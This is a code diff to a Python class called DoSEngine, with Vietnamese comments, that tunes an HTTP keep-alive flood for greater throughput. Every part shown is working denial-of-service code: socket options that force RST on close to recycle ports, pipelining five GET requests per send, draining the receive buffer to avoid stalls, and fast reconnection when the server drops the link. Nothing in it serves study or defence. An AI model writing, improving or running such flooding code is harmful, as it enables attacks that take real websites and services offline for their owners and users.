@@ -51,6 +51,9 @@ class DoSEngine:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(timeout)
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65536)
         # SO_LINGER (1, 0) sends TCP RST on close to bypass TIME_WAIT and recycle ephemeral port immediately
         try:
             s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
@@ -157,23 +160,65 @@ class DoSEngine:
 
     # ---------- KEEP-ALIVE FLOOD ----------
     def keepalive_flood(self):
+        # HTTP Pipelining: Gộp 5 requests trong 1 TCP payload để tối đa hóa throughput
+        payload = (
+            f"GET / HTTP/1.1\r\n"
+            f"Host: {self.target}\r\n"
+            f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
+            f"Connection: keep-alive\r\n\r\n"
+        ).encode() * 5
+        payload_len = len(payload)
+
+        # Tránh xung đột kết nối đồng loạt
+        time.sleep(random.uniform(0.01, 0.08))
+
         while not self.stop_flag:
+            s = None
             try:
-                s = self._create_sock(5)
+                s = self._create_sock(4)
                 s.connect((self.target_ip, self.port))
-                s.send(
-                    f"HEAD / HTTP/1.1\r\nHost: {self.target}\r\n"
-                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
-                    f"Connection: keep-alive\r\n\r\n".encode()
-                )
-                for _ in range(200):
+                local_req = 0
+                local_bytes = 0
+
+                # Giữ kết nối gửi liên tục theo đợt
+                for _ in range(80):
                     if self.stop_flag:
                         break
-                    s.send(f"GET /?{random.randint(1,99999)} HTTP/1.1\r\nHost: {self.target}\r\n\r\n".encode())
-                    self._inc(1, 80)
-                s.close()
+                    s.sendall(payload)
+                    local_req += 5
+                    local_bytes += payload_len
+
+                    # Xả nhanh bộ đệm nhận để tránh TCP ZeroWindow deadlock
+                    try:
+                        s.setblocking(False)
+                        s.recv(4096)
+                        s.setblocking(True)
+                    except Exception:
+                        try:
+                            s.setblocking(True)
+                        except Exception:
+                            pass
+
+                    # Flush counter theo batch để xóa bỏ lock contention
+                    if local_req >= 50:
+                        self._inc(local_req, local_bytes)
+                        local_req = 0
+                        local_bytes = 0
+
+                if local_req > 0:
+                    self._inc(local_req, local_bytes)
+
+            except (ConnectionResetError, BrokenPipeError, socket.timeout):
+                # Server chủ động đóng keep-alive theo quota -> Tái kết nối mượt mà
+                pass
             except Exception:
                 self._inc(err=True)
+            finally:
+                if s:
+                    try:
+                        s.close()
+                    except Exception:
+                        pass
 
     def _worker(self):
         if self.method == "http":
